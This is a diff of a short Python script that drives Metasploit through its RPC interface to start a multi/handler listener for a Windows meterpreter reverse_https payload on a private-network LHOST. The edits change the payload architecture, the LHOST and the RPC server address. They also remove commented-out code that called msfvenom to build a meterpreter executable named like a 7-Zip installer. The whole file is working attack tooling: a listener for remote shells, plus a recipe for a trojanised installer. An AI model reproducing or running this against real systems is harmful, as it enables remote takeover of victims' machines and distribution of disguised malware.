@@ -1,17 +1,12 @@
 from library.pymetasploit3.msfrpc import MsfRpcClient
-import subprocess
 
 def init(client):
-    #Create exe payload using msfvenom
-    #print("[-] Creating exe payload using msfvenom")
-    #subprocess.call("msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.1.7 LPORT=443 -f exe > 7z1900-x64.exe",shell=True)
-    
     fail=''
     handler=''
     exploithandler = client.modules.use('exploit','multi/handler')
     exploithandler['ExitOnSession'] = False
-    httpspl = client.modules.use('payload','windows/x64/meterpreter/reverse_https')
-    httpspl['LHOST'] = '192.168.1.7'
+    httpspl = client.modules.use('payload','windows/meterpreter/reverse_https')
+    httpspl['LHOST'] = '192.168.1.8'
     httpspl['LPORT'] = '443'
     print("[*] Setting up handler...")
     cid = client.consoles.console().cid
@@ -28,11 +23,11 @@ def init(client):
             fail = snippet.split('Exploit failed: ')
         x+=1
     if(len(fail)>1):
-        handler = "Handler failed to start...is there a server using port {}?".format(httpspl['LPORT'])
+        handler = "[+] Handler failed to start...is there a server using port {}?".format(httpspl['LPORT'])
     else:
-        handler = "Handler started successfully"
-    print("[+] " + handler)
+        handler = "[+] Handler started successfully"
+    print(handler)
 
 if __name__ == '__main__':
-    client = MsfRpcClient('123',port=55552)
+    client = MsfRpcClient("123",server='172.18.0.4',port=55552)
     start=init(client)
